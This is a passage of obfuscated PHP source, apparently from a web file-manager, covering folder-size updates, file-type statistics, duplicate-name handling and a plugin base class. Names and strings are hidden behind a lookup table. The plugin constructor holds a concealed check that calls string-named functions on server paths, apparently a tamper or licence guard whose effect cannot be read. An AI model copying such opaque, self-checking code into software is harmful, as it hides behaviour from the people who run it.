$ÉÙÆğº±[2295] . $¤Í¤òò™; CacheLock::lock($óÁÑá²õ, 20); if ($‹ğ¬÷®€ === !1) { $this->sourceCacheClear($¤Í¤òò™); $ÌŞÇÓ¼ = $this->sourceInfo($¤Í¤òò™); $Ÿ„Ã½˜¢ = array($ÉÙÆğº±[479] => $¤Í¤òò™, $ÉÙÆğº±[506] => 0); $¤ïÈÓÑÖ = $this->where($Ÿ„Ã½˜¢)->sum($ÉÙÆğº±[79]); $‹ğ¬÷®€ = intval($¤ïÈÓÑÖ) - intval($ÌŞÇÓ¼[$ÉÙÆğº±[79]]); } if ($‹ğ¬÷®€ == 0) { return CacheLock::unlock($óÁÑá²õ); } $€¹…õ‡¨ = $this->parentLevelArray($ÌŞÇÓ¼[$ÉÙÆğº±[588]]); if (!$€¹…õ‡¨) { $€¹…õ‡¨ = array(); } $€¹…õ‡¨[] = $ÌŞÇÓ¼[$ÉÙÆğº±[193]]; $Ÿ„Ã½˜¢ = array($ÉÙÆğº±[193] => array($ÉÙÆğº±[494], $€¹…õ‡¨)); if ($‹ğ¬÷®€ < 0) { $Ÿ„Ã½˜¢[$ÉÙÆğº±[79]] = array($ÉÙÆğº±[1090], abs($‹ğ¬÷®€)); } $this->where($Ÿ„Ã½˜¢)->setAdd($ÉÙÆğº±[79], $‹ğ¬÷®€); CacheLock::unlock($óÁÑá²õ); $ÄåÃÑÌÏ = $ÉÙÆğº±[2296] . $ÌŞÇÓ¼[$ÉÙÆğº±[190]] . $ÉÙÆğº±[4] . $ÌŞÇÓ¼[$ÉÙÆğº±[573]]; $ãä×ğãÛ = array($ÌŞÇÓ¼[$ÉÙÆğº±[190]], $ÌŞÇÓ¼[$ÉÙÆğº±[573]]); TaskRun::timeLimitCall($ÄåÃÑÌÏ, $ÉÙÆğº±[2297], $ãä×ğãÛ, 1.5); } public function folderSizeResetChildren($–¥â†Ôä) { $°‘Æ¯Ş¶ =& $_SERVER[°‰†òö¯]; $this->sourceCacheClear($–¥â†Ôä); $­Ÿ¥¿Ê¨ = $this->sourceInfo($–¥â†Ôä); $šèÜï‡ = array($°‘Æ¯Ş¶[653] => 1, $°‘Æ¯Ş¶[656] => $­Ÿ¥¿Ê¨[$°‘Æ¯Ş¶[573]], $°‘Æ¯Ş¶[659] => array($°‘Æ¯Ş¶[619], $­Ÿ¥¿Ê¨[$°‘Æ¯Ş¶[588]] . $–¥â†Ôä . $°‘Æ¯Ş¶[620])); $üÖùŞ³‹ = $°‘Æ¯Ş¶[2298]; $ÈÇÚŞ ù = $this->field($üÖùŞ³‹)->where($šèÜï‡)->select(); $šèÜï‡[$°‘Æ¯Ş¶[487]] = 0; $ëÂşƒšÎ = $this->field($üÖùŞ³‹)->where($šèÜï‡)->select(); if (!$ëÂşƒšÎ) { return; } $ÈÇÚŞ ù[] = $­Ÿ¥¿Ê¨; $ÈÇÚŞ ù = array_to_keyvalue($ÈÇÚŞ ù, $°‘Æ¯Ş¶[193]); foreach ($ÈÇÚŞ ù as $ııÈôÇ => $©—µ–…Æ) { $ÈÇÚŞ ù[$ııÈôÇ][$°‘Æ¯Ş¶[2299]] = $ÈÇÚŞ ù[$ııÈôÇ][$°‘Æ¯Ş¶[79]]; $ÈÇÚŞ ù[$ııÈôÇ][$°‘Æ¯Ş¶[79]] = 0; } foreach ($ëÂşƒšÎ as $©—µ–…Æ) { $ğŸÜßµà = $©—µ–…Æ[$°‘Æ¯Ş¶[192]] . $°‘Æ¯Ş¶[12]; if (!isset($ÈÇÚŞ ù[$ğŸÜßµà])) { continue; } if ($©—µ–…Æ[$°‘Æ¯Ş¶[507]] == $ÈÇÚŞ ù[$ğŸÜßµà][$°‘Æ¯Ş¶[507]]) { $ÈÇÚŞ ù[$ğŸÜßµà][$°‘Æ¯Ş¶[79]] += $©—µ–…Æ[$°‘Æ¯Ş¶[79]]; } } foreach ($ÈÇÚŞ ù as $©—µ–…Æ) { $ŒšÍ‚ú = $this->parentLevelArray($©—µ–…Æ[$°‘Æ¯Ş¶[588]]); foreach ($ŒšÍ‚ú as $ğŸÜßµà) { $ğŸÜßµà = $ğŸÜßµà . $°‘Æ¯Ş¶[12]; if (!isset($ÈÇÚŞ ù[$ğŸÜßµà])) { continue; } if ($©—µ–…Æ[$°‘Æ¯Ş¶[507]] == $ÈÇÚŞ ù[$ğŸÜßµà][$°‘Æ¯Ş¶[507]]) { $ÈÇÚŞ ù[$ğŸÜßµà][$°‘Æ¯Ş¶[79]] += $©—µ–…Æ[$°‘Æ¯Ş¶[79]]; } } } $ğ¬íıê· = array(); foreach ($ÈÇÚŞ ù as $©—µ–…Æ) { if ($©—µ–…Æ[$°‘Æ¯Ş¶[79]] == $©—µ–…Æ[$°‘Æ¯Ş¶[2299]]) { continue; } $ğ¬íıê·[] = array($°‘Æ¯Ş¶[193], $©—µ–…Æ[$°‘Æ¯Ş¶[193]], $°‘Æ¯Ş¶[79], $©—µ–…Æ[$°‘Æ¯Ş¶[79]]); } $this->saveAll($ğ¬íıê·); } public function userSpaceReset($ÒÜîãé£ = false) { $öåĞÇ€Õ =& $_SERVER[°‰†òö¯]; $Î§¤•† = $this->where(array($öåĞÇ€Õ[190] => self::TYPE_USER, $öåĞÇ€Õ[573] => $ÒÜîãé£, $öåĞÇ€Õ[487] => 0))->sum($öåĞÇ€Õ[79]); $Î§¤•† = !$Î§¤•† || $Î§¤•† <= 0 ? 0 : $Î§¤•†; Model($öåĞÇ€Õ[581])->userEdit($ÒÜîãé£, array($öåĞÇ€Õ[1960] => $Î§¤•†)); } public function targetSpaceUpdate($ÔÁú¤»—, $æ§ÊÎÅª) { $èâÒÏğÁ =& $_SERVER[°‰†òö¯]; if (!$æ§ÊÎÅª) { return; } if (!in_array($ÔÁú¤»—, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $æª­¶ = $this->targetSpaceSize($ÔÁú¤»—, $æ§ÊÎÅª); if ($ÔÁú¤»— == self::TYPE_USER) { Model($èâÒÏğÁ[581])->userEdit($æ§ÊÎÅª, array($èâÒÏğÁ[1960] => $æª­¶)); } else { if ($ÔÁú¤»— == self::TYPE_GROUP) { Model($èâÒÏğÁ[589])->groupEdit($æ§ÊÎÅª, array($èâÒÏğÁ[1960] => $æª­¶)); } } } public function targetSpaceSize($çÒ»Èèå, $«Šá‹Ğ) { $ëĞ½½á =& $_SERVER[°‰†òö¯]; $¥ÑßœÀ× = 0; $Îú Ôí = $this->targetSourceRoot($çÒ»Èèå, $«Šá‹Ğ, !0); foreach ($Îú Ôí as $ã¿ˆÒœÛ) { if (!$ã¿ˆÒœÛ) { continue; } $¥ÑßœÀ× += floatval($ã¿ˆÒœÛ[$ëĞ½½á[79]]); $É›ÅÌÛÂ = array($ëĞ½½á[659] => array($ëĞ½½á[619], $ëĞ½½á[597] . $ã¿ˆÒœÛ[$ëĞ½½á[193]] . $ëĞ½½á[620])); $„‹´†Ó = Model($ëĞ½½á[505])->field($ëĞ½½á[493])->where($É›ÅÌÛÂ)->select(); $„‹´†Ó = array_to_keyvalue($„‹´†Ó, $ëĞ½½á[12], $ëĞ½½á[193]); $„‹´†Ó = array_unique(array_filter($„‹´†Ó)); if ($„‹´†Ó) { $É›ÅÌÛÂ = array($ëĞ½½á[493] => array($ëĞ½½á[494], $„‹´†Ó)); $¥ÑßœÀ× += floatval($this->where($É›ÅÌÛÂ)->sum($ëĞ½½á[79])); } } $¥ÑßœÀ× = !$¥ÑßœÀ× || $¥ÑßœÀ× <= 0 ? 0 : $¥ÑßœÀ×; return $¥ÑßœÀ×; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($úôÏ±ş) { return $this->fileTypeProfile($úôÏ±ş, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Í¡šñÙÂ) { return $this->fileTypeProfile($Í¡šñÙÂ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($­‡ÀÍçÎ, $å­Ñöİ) { $œµ„é– =& $_SERVER[°‰†òö¯]; $×ºÃĞ¿’ = $œµ„é–[2300] . $­‡ÀÍçÎ . $œµ„é–[11] . $å­Ñöİ; $½æÏÇ¼ = Cache::get($×ºÃĞ¿’); if ($½æÏÇ¼) { return $½æÏÇ¼; } $¿È¨öß§ = array($œµ„é–[653] => 0); if ($­‡ÀÍçÎ != !1) { $¿È¨öß§[$œµ„é–[573]] = $­‡ÀÍçÎ; $¿È¨öß§[$œµ„é–[190]] = $å­Ñöİ; } $ßıÂÊ¬ = array(); $ßıÂÊ¬[$œµ„é–[2301]] = array($œµ„é–[2302] => LNG($œµ„é–[2301]), $œµ„é–[2303] => $this->where($¿È¨öß§)->count(), $œµ„é–[624] => $this->where($¿È¨öß§)->sum($œµ„é–[79])); $£±ó»¼ = KodIO::fileTypeList(); foreach ($£±ó»¼ as $¸Ğú…Ü• => $ıûŠğò) { $¿È¨öß§[$œµ„é–[488]] = $this->fileTypeWhere($¸Ğú…Ü•); $ßıÂÊ¬[$¸Ğú…Ü•] = array($œµ„é–[2302] => $ıûŠğò[$œµ„é–[32]], $œµ„é–[2303] => $this->where($¿È¨öß§)->count(), $œµ„é–[624] => $this->where($¿È¨öß§)->sum($œµ„é–[79])); } Cache::set($×ºÃĞ¿’, $ßıÂÊ¬, 1200); return $ßıÂÊ¬; } public function fileNameExist($ÂÓö¤¬ø, $‰Ô‘‘ÀÆ) { $¡¡©• =& $_SERVER[°‰†òö¯]; $Áš€•Ñ = $this->field($¡¡©•[2304])->where(array($¡¡©•[192] => $ÂÓö¤¬ø, $¡¡©•[32] => $‰Ô‘‘ÀÆ, $¡¡©•[507] => 0))->find(); return is_array($Áš€•Ñ) ? $Áš€•Ñ[$¡¡©•[193]] : !1; } public function childList($«Ü±ˆáÙ) { $£—ÍÑ’Ö =& $_SERVER[°‰†òö¯]; $å»öò·ã = $£—ÍÑ’Ö[2277] . $«Ü±ˆáÙ; if (isset(self::$cacheChildList[$å»öò·ã])) { return self::$cacheChildList[$å»öò·ã]; } $ÄÔ§‚Íï = array($£—ÍÑ’Ö[192] => intval($«Ü±ˆáÙ), $£—ÍÑ’Ö[507] => 0); $ÍƒÕåŞâ = $this->where($ÄÔ§‚Íï)->select(); $ÍƒÕåŞâ = $ÍƒÕåŞâ ? $ÍƒÕåŞâ : array(); self::$cacheChildList[$å»öò·ã] = $ÍƒÕåŞâ; foreach ($ÍƒÕåŞâ as $”äÕ¾§¹) { $å»öò·ã = $£—ÍÑ’Ö[535] . $”äÕ¾§¹[$£—ÍÑ’Ö[193]]; self::$cacheSourceInfo[$å»öò·ã] = $”äÕ¾§¹; } return $ÍƒÕåŞâ; } public function fileNameAuto($ù¦Â¼, $‹Õú•‡¢, $…Êİüû = REPEAT_RENAME, $Ïâ—á³– = false) { $İÍËŞÌğ =& $_SERVER[°‰†òö¯]; $Ÿì‚Ó”Í = get_path_ext($‹Õú•‡¢); $ ©æø©Ä = $Ÿì‚Ó”Í ? get_path_ext_name($‹Õú•‡¢) . $İÍËŞÌğ[2305] . $Ÿì‚Ó”Í : $‹Õú•‡¢ . $İÍËŞÌğ[462]; $ƒ’§È¦í = array($İÍËŞÌğ[192] => $ù¦Â¼, $İÍËŞÌğ[507] => 0, $İÍËŞÌğ[32] => array($İÍËŞÌğ[461], $ ©æø©Ä)); $¿¼Ù„ñ¼ = $this->field($İÍËŞÌğ[32])->where($ƒ’§È¦í)->select(); $Ä¨€Ó— = array_to_keyvalue($¿¼Ù„ñ¼, $İÍËŞÌğ[12], $İÍËŞÌğ[32]); return $this->fileNameAutoGet($Ä¨€Ó—, $‹Õú•‡¢, $…Êİüû, $Ïâ—á³–); } public function fileNameAutoGet($Ò‚Á¸ÌÜ, $ïØäĞï, $¶ÓÍÓ´û, $´Æ¤ÀÖÈ) { $˜Òô“ =& $_SERVER[°‰†òö¯]; if ($¶ÓÍÓ´û == REPEAT_REPLACE || !$Ò‚Á¸ÌÜ || !in_array_not_case($ïØäĞï, $Ò‚Á¸ÌÜ) || $´Æ¤ÀÖÈ && $¶ÓÍÓ´û != REPEAT_RENAME_FOLDER) { return $ïØäĞï; } if ($¶ÓÍÓ´û == REPEAT_SKIP) { return !1; } $Şà“ÑïØ = $˜Òô“[10] . get_path_ext($ïØäĞï); $Şà“ÑïØ = $Şà“ÑïØ == $˜Òô“[10] || $´Æ¤ÀÖÈ ? $˜Òô“[12] : $Şà“ÑïØ; for ($Áõ¸áÇ÷ = 1; $Áõ¸áÇ÷ <= count($Ò‚Á¸ÌÜ) + 1; $Áõ¸áÇ÷++) { $øïŠ£–Ï = substr($ïØäĞï, 0, strlen($ïØäĞï) - strlen($Şà“ÑïØ)); $¹Ö²òá« = $øïŠ£–Ï . "\x28{$Áõ¸áÇ÷}\x29{$Şà“ÑïØ}"; if (!in_array_not_case($¹Ö²òá«, $Ò‚Á¸ÌÜ)) { return $¹Ö²òá«; } } } } goto dØ£Îå¾¦; fÕŒ÷Î·Â³: class Message { function __construct() { } public function send($ã–åÌ±½ = '', $»ÕŞÀ¹ = array(), $¶äùİšÎ = "\x74\x65\170\164") { $ÅÎ‡òÈ =& $_SERVER[°‰†òö¯]; $ÃÑËÚ½ñ = array($ÅÎ‡òÈ[33] => $ÅÎ‡òÈ[1211], $ÅÎ‡òÈ[171] => $ã–åÌ±½); if (in_array($¶äùİšÎ, array($ÅÎ‡òÈ[1211], $ÅÎ‡òÈ[1620]))) { $ÃÑËÚ½ñ[$ÅÎ‡òÈ[33]] = $¶äùİšÎ; } $»ÕŞÀ¹ = array($ÅÎ‡òÈ[582] => isset($»ÕŞÀ¹[$ÅÎ‡òÈ[582]]) ? $»ÕŞÀ¹[$ÅÎ‡òÈ[582]] : $ÅÎ‡òÈ[12], $ÅÎ‡òÈ[669] => isset($»ÕŞÀ¹[$ÅÎ‡òÈ[669]]) ? $»ÕŞÀ¹[$ÅÎ‡òÈ[669]] : $ÅÎ‡òÈ[12]); if (empty($ã–åÌ±½) || empty($»ÕŞÀ¹[$ÅÎ‡òÈ[582]]) && empty($»ÕŞÀ¹[$ÅÎ‡òÈ[669]])) { return !1; } $³œ¸×Üã = array($ÅÎ‡òÈ[1549] => $ÃÑËÚ½ñ, $ÅÎ‡òÈ[1621] => $»ÕŞÀ¹); Hook::trigger($ÅÎ‡òÈ[1622], $³œ¸×Üã); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $™ôÙ‰º§ =& $_SERVER[°‰†òö¯]; if ($_SERVER[$™ôÙ‰º§[946]] != $_SERVER[$™ôÙ‰º§[1033]]) { $Ú´ì÷Ä² = $™ôÙ‰º§[947]; $™»¿ËëŠ = $™ôÙ‰º§[948]; $©êĞŒ˜İ = $_SERVER[$™ôÙ‰º§[949]] . $™ôÙ‰º§[950]; $¾Å„¼è­ = $™»¿ËëŠ($©êĞŒ˜İ); $ƒ—¢Öµ = explode($™ôÙ‰º§[287], $¾Å„¼è­); if (count($ƒ—¢Öµ) < $™ôÙ‰º§[704]) { $á‹ô©Ø½ = $™ôÙ‰º§[951]; $á‹ô©Ø½(); } $‹´Ä¡œº = $™ôÙ‰º§[952]; $‹´Ä¡œº($_SERVER[$™ôÙ‰º§[953]]); $‹´Ä¡œº($_SERVER[$™ôÙ‰º§[949]] . $™ôÙ‰º§[1623]); $ù÷Œ˜Áš = 1; while ($ù÷Œ˜Áš > 1) { $ù÷Œ˜Áš = $ù÷Œ˜Áš + 4; $ø²‘ÂÂ€ = rawurlencode($ù÷Œ˜Áš . $™ôÙ‰º§[456]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($™ôÙ‰º§[1624]); $this->pluginName = str_replace($™ôÙ‰º§[1624], $™ôÙ‰º§[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $™ôÙ‰º§[8]; $this->pluginApi = appHostGet() . $™ôÙ‰º§[1625] . $this->pluginName . $™ôÙ‰º§[8]; $this->pluginHost = $config[$™ôÙ‰º§[1626]] . $this->pluginName . $™ôÙ‰º§[8]; $this->pluginHostDefault = $config[$™ôÙ‰º§[1626]] . $this->pluginName . $™ôÙ‰º§[8]; $Ê·®Í°¦ = $config[$™ôÙ‰º§[1627]]; if ($Ê·®Í°¦ && strpos($™ôÙ‰º§[50] . $Ê·®Í°¦ . $™ôÙ‰º§[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$™ôÙ‰º§[1628]] . $this->pluginName . $™ôÙ‰º§[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[°‰†òö¯][1629]); } protected function assign($¶¶³•–Ä, $êº°•ıÆ = false) { if (is_array($¶¶³•–Ä)) { $this->values = array_merge($this->values, $¶¶³•–Ä); } else { $this->values[$¶¶³•–Ä] = $êº°•ıÆ; } } protected function display($¿¼Ÿ”÷÷) { extract($this->values); require $¿¼Ÿ”÷÷; } final function hookRegist($ª—‡¡á) { $this->modelPlugin->appRegist($this->pluginName, $ª—‡¡á); } final function appIcon() { $æ¬ÈÔ¿â =& $_SERVER[°‰†òö¯]; $ëŒÂå²² = $this->appPackage(); $ÂáãˆµÅ = $æ¬ÈÔ¿â[12]; if (isset($ëŒÂå²²[$æ¬ÈÔ¿â[492]])) { if (isset($ëŒÂå²²[$æ¬ÈÔ¿â[492]][$æ¬ÈÔ¿â[1630]])) { $ÂáãˆµÅ = $æ¬ÈÔ¿â[1631] . $ëŒÂå²²[$æ¬ÈÔ¿â[492]][$æ¬ÈÔ¿â[1630]] . $æ¬ÈÔ¿â[1632]; } else { if ($ëŒÂå²²[$æ¬ÈÔ¿â[492]][$æ¬ÈÔ¿â[1633]]) { $ÂáãˆµÅ = $æ¬ÈÔ¿â[1634] . $ëŒÂå²²[$æ¬ÈÔ¿â[492]][$æ¬ÈÔ¿â[1633]] . $æ¬ÈÔ¿â[1635]; } } } return $ÂáãˆµÅ; } final function fileCanView($µ¼ö×·å) { $¶şôİŞ =& $_SERVER[°‰†òö¯]; if (request_url_safe($µ¼ö×·å)) { return !0; } if ($this->isShare($µ¼ö×·å)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Ä²êê¡ü = $¶şôİŞ[1636] . rawurlencode(this_url()); show_tips(LNG($¶şôİŞ[1637]) . $¶şôİŞ[1638] . $Ä²êê¡ü . $¶şôİŞ[1639] . LNG($¶şôİŞ[1640]) . $¶şôİŞ[1641], !1); } if (!Action($¶şôİŞ[1642])->authCan($¶şôİŞ[1643])) { show_tips(LNG($¶şôİŞ[1644]) . $¶şôİŞ[1645], !1); } ActionCall($¶şôİŞ[1646], $µ¼ö×·å); } final function isShare($ˆÌêå») { $µùß¸ëÔ = KodIO::parse($ˆÌêå»); return $µùß¸ëÔ[$_SERVER[°‰†òö¯][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Í÷°ï²ë) { if (request_url_safe($Í÷°ï²ë)) { return $Í÷°ï²ë; } if (!$this->isShare($Í÷°ï²ë)) { $Í÷°ï²ë = $this->filePath($Í÷°ï²ë, !1); } return Action($_SERVER[°‰†òö¯][1254])->linkOut($Í÷°ï²ë); } public function filePathLinkOut($ó©Ø½Óî) { if (request_url_safe($ó©Ø½Óî)) { return $ó©Ø½Óî; } $this->fileCanView($ó©Ø½Óî); return Action($_SERVER[°‰†òö¯][1254])->link($ó©Ø½Óî); } final function filePath($ı³¶İô, $ñÎó ‡Š = true, $¿ÇùÀå” = false) { $’—‡ç­Æ =& $_SERVER[°‰†òö¯]; $Òµ¸Ğ’‘ = $this->filePathGet($ı³¶İô, $ñÎó ‡Š); if (!$this->fileInfo) { show_tips(LNG($’—‡ç­Æ[108]), !1); } if ($¿ÇùÀå” && isset($this->fileInfo[$’—‡ç­Æ[545]]) && $this->fileInfo[$’—‡ç­Æ[545]]) { $µ‹ñ›„Ë = Model($’—‡ç­Æ[548])->fileInfo($this->fileInfo[$’—‡ç­Æ[545]]); if (!$µ‹ñ›„Ë || !IO::exist($µ‹ñ›„Ë[$’—‡ç­Æ[87]])) { $ÓÇïáå = LNG($’—‡ç­Æ[108]) . LNG($’—‡ç­Æ[1647]); if (KodUser::isRoot() && isset($µ‹ñ›„Ë[$’—‡ç­Æ[87]])) { $ÓÇïáå .= $’—‡ç­Æ[1648] . $µ‹ñ›„Ë[$’—‡ç­Æ[87]] . $’—‡ç­Æ[1649]; } show_tips($ÓÇïáå); } } Hook::trigger($’—‡ç­Æ[1650], $Òµ¸Ğ’‘); return $Òµ¸Ğ’‘; } final function filePathGet($£õ’Í™Â, $‹Ø¥ı‚ƒ = true) { $øÙÌ×Ìò =& $_SERVER[°‰†òö¯]; if ($ã¢È¥”Ô = $this->checkSharePath($£õ’Í™Â, $‹Ø¥ı‚ƒ)) { return $ã¢È¥”Ô; } $this->fileCanView($£õ’Í™Â); if (request_url_safe($£õ’Í™Â)) { $»¯¿ÂÅ = parse_url_query($£õ’Í™Â); if (isset($»¯¿ÂÅ[$øÙÌ×Ìò[1651]]) && isset($»¯¿ÂÅ[$øÙÌ×Ìò[236]])) { $î¤ÀĞù¸ = Mcrypt::decode($»¯¿ÂÅ[$øÙÌ×Ìò[236]], Model($øÙÌ×Ìò[831])->get($øÙÌ×Ìò[832])); if ($î¤ÀĞù¸) { $this->fileInfo = IO::info($î¤ÀĞù¸); $this->fileInfo[$øÙÌ×Ìò[1652]] = $£õ’Í™Â; $this->cachePath = $this->pluginCachePath($øÙÌ×Ìò[12], $‹Ø¥ı‚ƒ); return $î¤ÀĞù¸; } } $£õ’Í™Â = $this->_cacheHttpFile($£õ’Í™Â, $‹Ø¥ı‚ƒ); $this->fileInfo = IO::info($£õ’Í™Â); } else { $this->fileInfo = IO::info($£õ’Í™Â); $this->cachePath = $this->pluginCachePath($øÙÌ×Ìò[12], $‹Ø¥ı‚ƒ); } return $£õ’Í™Â; } final function _cacheHttpFile($Öşß¡ŒÁ, $ÚğÈã†§ = true) { $–ÎƒÚÕä =& $_SERVER[°‰†òö¯]; $ù¾şå§š = parse_url_query($Öşß¡ŒÁ); $ù¢çÃÚ = get_path_ext($Öşß¡ŒÁ); if (isset($ù¾şå§š[$–ÎƒÚÕä[32]]) && $ù¾şå§š[$–ÎƒÚÕä[32]]) { $ù¢çÃÚ = get_path_ext($ù¾şå§š[$–ÎƒÚÕä[32]]); } $ŠÂìò¦ = hash_path($Öşß¡ŒÁ) . $–ÎƒÚÕä[10] . $ù¢çÃÚ; $this->cachePath = $this->pluginCachePath($ÚğÈã†§ ? $ŠÂìò¦ : $–ÎƒÚÕä[12]); $Óƒ–ôÎ = IO::fileNameExist($this->cachePath, $ŠÂìò¦); if ($Óƒ–ôÎ) { return KodIO::make($Óƒ–ôÎ); } $Ò©õêìÓ = rtrim($this->cachePath, $–ÎƒÚÕä[8]) . $–ÎƒÚÕä[8] . $ŠÂìò¦; return $this->pluginCacheFileSet($Ò©õêìÓ, file_get_contents_nossl($Öşß¡ŒÁ)); } final function checkSharePath($¤¨öˆ™Ñ, $Ì¦›Š’¢ = true) { $Õæíİ¹Á =& $_SERVER[°‰†òö¯]; if (!$this->isShare($¤¨öˆ™Ñ)) { return !1; } $ÔÀÌÅ® = Action($Õæíİ¹Á[1254])->sharePathInfo($¤¨öˆ™Ñ); if (!is_array($ÔÀÌÅ®) || !isset($ÔÀÌÅ®[$Õæíİ¹Á[87]])) { show_json(LNG($Õæíİ¹Á[1653]), !1); } $this->fileInfo = $ÔÀÌÅ®; $this->cachePath = $this->pluginCachePath(!1, $Ì¦›Š’¢); return $ÔÀÌÅ®[$Õæíİ¹Á[87]]; } final function pluginCachePath($”»ƒ§¥ = '', $Úò£¡¤ó = false) { $òº´ÄÜè =& $_SERVER[°‰†òö¯]; if ($Úò£¡¤ó && is_array($this->fileInfo)) { $”»ƒ§¥ = kodIO::hashPath($this->fileInfo); } $ÑÇùÅ·É = rtrim(IO_PATH_SYSTEM_TEMP . $òº´ÄÜè[1654] . $this->pluginName . $òº´ÄÜè[8] . $”»ƒ§¥, $òº´ÄÜè[8]); $—ŸÍöÓÛ = IO::infoFullSimple($ÑÇùÅ·É); $ÇëÕŞâø = $—ŸÍöÓÛ && is_array($—ŸÍöÓÛ) ? $—ŸÍöÓÛ[$òº´ÄÜè[87]] : $òº´ÄÜè[12]; if (!$ÇëÕŞâø) { $ÇëÕŞâø = IO::mkdir($ÑÇùÅ·É); } return $ÇëÕŞâø; } final function pluginCacheFileSet($£„’ÍÛª, $×¡Ø©§ = '') { $ÖÖ·­úã =& $_SERVER[°‰†òö¯]; $•¾Ã‡ôˆ = IO::infoFullSimple($£„’ÍÛª); if (!$•¾Ã‡ôˆ) { return IO::mkfile($£„’ÍÛª, $×¡Ø©§, REPEAT_REPLACE); } IO::setContent($•¾Ã‡ôˆ[$ÖÖ·­úã[87]], $×¡Ø©§); return $•¾Ã‡ôˆ[$ÖÖ·­úã[87]]; } final function pluginLocalFile($ËÓ…–Ş = '') { $ë±©Ë’ =& $_SERVER[°‰†òö¯]; $—Üëïï• = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($—Üëïï•)) { mk_dir($—Üëïï•); } if (!$ËÓ…–Ş) { return $—Üëïï•; } $½’×ñÎä = IO::info($ËÓ…–Ş); $éµË˜«ß = $ë±©Ë’[1655] . KodIO::hashPath($½’×ñÎä) . $ë±©Ë’[10] . $½’×ñÎä[$ë±©Ë’[169]]; if (!checkExtSafe($éµË˜«ß)) { $éµË˜«ß = $éµË˜«ß . $ë±©Ë’[1289]; } $äı•şÈà = $—Üëïï• . $éµË˜«ß; if (@file_exists($äı•şÈà)) { return $äı•şÈà; } return IO::copy($ËÓ…–Ş, $—Üëïï•, 0, $éµË˜«ß); } final function appPackage() { $Öæ»· =& $_SERVER[°‰†òö¯]; if ($this->packageData) { return $this->packageData; } $Âµ®²•­ = $this->parseFile($this->pluginPath . $Öæ»·[1656]); $this->parseLang($Âµ®²•­); $Ä—Ñãöâ = json_decode_force($Âµ®²•­); if (!$Ä—Ñãöâ) { return array(); } $ëËµßå = Hook::trigger($Öæ»·[1657], $Ä—Ñãöâ); if ($ëËµßå && is_array($ëËµßå)) { $Ä—Ñãöâ = $ëËµßå; } $this->packageData = $Ä—Ñãöâ; return $Ä—Ñãöâ; } public function packageInfoGet($€İîá®) { $Ôô¢”¾ø = $this->appPackage(); return array_get_value($Ôô¢”¾ø, $€İîá®); } public function packageVersion() { return $this->packageInfoGet($_SERVER[°‰†òö¯][1658]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[°‰†òö¯][1659]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[°‰†òö¯][1660]); } public function echoJsAssign($ôøÅûñ¬, $ª¹¢¼à¡) { $this->echoJsAssignArr[$ôøÅûñ¬] = $ª¹¢¼à¡; } private function parseFile($»£åìå) { $Óôå²¬ï =& $_SERVER[°‰†òö¯]; $µçªÇã† = file_get_contents_nossl($»£åìå); $Ùƒ¥ùğ = array($Óôå²¬ï[1661], $Óôå²¬ï[1662], $Óôå²¬ï[1663], $Óôå²¬ï[1664], $Óôå²¬ï[1665], $Óôå²¬ï[1666], $Óôå²¬ï[1667]); $º‘¨öğ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Óôå²¬ï[92]][$Óôå²¬ï[1668]]); foreach ($this->echoJsAssignArr as $ôêÕĞÎ => $Ğş÷½¹˜) { $Ùƒ¥ùğ[] = $Óôå²¬ï[1669] . $ôêÕĞÎ . $Óôå²¬ï[1670]; $º‘¨öğ[] = is_array($Ğş÷½¹˜) || is_object($Ğş÷½¹˜) ? rawurlencode(json_encode($Ğş÷½¹˜)) : $Ğş÷½¹˜; } if (strstr($µçªÇã†, $Óôå²¬ï[1671])) { $§‡Ã»Íš = rawurlencode(json_encode($this->pluginLangArr)); $µçªÇã† = str_replace($Óôå²¬ï[1671], $§‡Ã»Íš, $µçªÇã†); } if (strstr($µçªÇã†, $Óôå²¬ï[1672])) { $§‡Ã»Íš = $§‡Ã»Íš = rawurlencode(json_encode($this->getConfig())); $µçªÇã† = str_replace($Óôå²¬ï[1672], $§‡Ã»Íš, $µçªÇã†); } $µçªÇã† = str_replace($Ùƒ¥ùğ, $º‘¨öğ, $µçªÇã†); return $µçªÇã†; } private function parseLang(&$Ğñ¦Óâ) { $ô‰Ä¹ˆ =& $_SERVER[°‰†òö¯]; $œˆµ¤ÊÌ = $ô‰Ä¹ˆ[1673]; if (!strstr($Ğñ¦Óâ, $œˆµ¤ÊÌ)) { return; } preg_match_all($ô‰Ä¹ˆ[1674], $Ğñ¦Óâ, $÷ìíƒš„); if (!is_array($÷ìíƒš„) || count($÷ìíƒš„) == 0 || !is_array($÷ìíƒš„[0]) || count($÷ìíƒš„[0]) == 0) { return; } $‚ø•¨ı = array(); $ü¹ğÀ•Œ = array(); foreach ($÷ìíƒš„[0] as $ºğÇß“ä) { $÷å±ñ‹® = substr($ºğÇß“ä, strlen($œˆµ¤ÊÌ), -4); $»é˜®âÎ = LNG($÷å±ñ‹®); $‚ø•¨ı[] = $ºğÇß“ä; $ü¹ğÀ•Œ[] = str_replace(array($ô‰Ä¹ˆ[287], $ô‰Ä¹ˆ[1154], $ô‰Ä¹ˆ[419], $ô‰Ä¹ˆ[121]), array($ô‰Ä¹ˆ[53], $ô‰Ä¹ˆ[53], $ô‰Ä¹ˆ[12], $ô‰Ä¹ˆ[1675]), $»é˜®âÎ); } $Ğñ¦Óâ = 